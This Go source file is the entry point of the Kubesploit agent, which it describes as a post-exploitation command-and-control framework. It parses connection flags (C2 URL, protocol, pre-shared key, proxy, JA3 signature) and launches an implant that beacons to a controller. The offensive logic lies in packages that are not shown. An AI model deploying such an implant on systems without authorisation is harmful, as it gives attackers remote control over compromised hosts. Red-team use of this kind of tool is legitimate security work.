// Kubesploit is a post-exploitation command and control framework built on top of Merlin by Russel Van Tuyl.
// This file is part of Kubesploit.
// Copyright (c) 2021 CyberArk Software Ltd. All rights reserved.

// Kubesploit is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Kubesploit is distributed in the hope that it will be useful for enhancing organizations' security.
// Kubesploit shall not be used in any malicious manner.
// Kubesploit is distributed AS-IS, WITHOUT ANY WARRANTY; including the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Kubesploit.  If not, see <http://www.gnu.org/licenses/>.

package main

import (
	// Standard
	"flag"
	"fmt"
	merlin "kubesploit/pkg"
	"kubesploit/pkg/agent"

	"os"
	"time"

	// 3rd Party
	"github.com/fatih/color"

	// Merlin
	//"kubesploit/pkg"
)

// GLOBAL VARIABLES

var url = "https://127.0.0.1:443"
var protocol = "h2"
var build = "nonRelease"
var psk = "kubesploit"
var proxy = ""
var host = ""
var ja3 = ""


func main() {
	verbose := flag.Bool("v", false, "Enable verbose output")
	version := flag.Bool("version", false, "Print the agent version and exit")
	debug := flag.Bool("debug", false, "Enable debug output")
	flag.StringVar(&url, "url", url, "Full URL for agent to connect to")
	flag.StringVar(&psk, "psk", psk, "Pre-Shared Key used to encrypt initial communications")
	flag.StringVar(&protocol, "proto", protocol, "Protocol for the agent to connect with [https (HTTP/1.1), http (HTTP/1.1 Clear-Text), h2 (HTTP/2), h2c (HTTP/2 Clear-Text), http3 (QUIC or HTTP/3.0)]")
	flag.StringVar(&proxy, "proxy", proxy, "Hardcoded proxy to use for http/1.1 traffic only that will override host configuration")
	flag.StringVar(&host, "host", host, "HTTP Host header")
	flag.StringVar(&ja3, "ja3", ja3, "JA3 signature string (not the MD5 hash). Overrides -proto flag")
	sleep := flag.Duration("sleep", 10000*time.Millisecond, "Time for agent to sleep")
	flag.Usage = usage
	flag.Parse()

	if *version {
		color.Blue(fmt.Sprintf("Kubesploit Agent Version: %s", merlin.Version))
		color.Blue(fmt.Sprintf("Merlin Agent Version: %s", merlin.MerlinVersion))
		color.Blue(fmt.Sprintf("Kubesploit Agent Build: %s", build))
		os.Exit(0)
	}

	// Setup and run agent
	a, err := agent.New(protocol, url, host, psk, proxy, ja3, *verbose, *debug)
	if err != nil {
		if *verbose {
			color.Red(err.Error())
		}
		os.Exit(1)
	}
	a.WaitTime = *sleep
	errRun := a.Run()
	if errRun != nil {
		if *verbose {
			color.Red(errRun.Error())
		}
		os.Exit(1)
	}
}

// usage prints command line options
func usage() {
	fmt.Printf("Kubesploit Agent\r\n")
	flag.PrintDefaults()
	os.Exit(0)
}
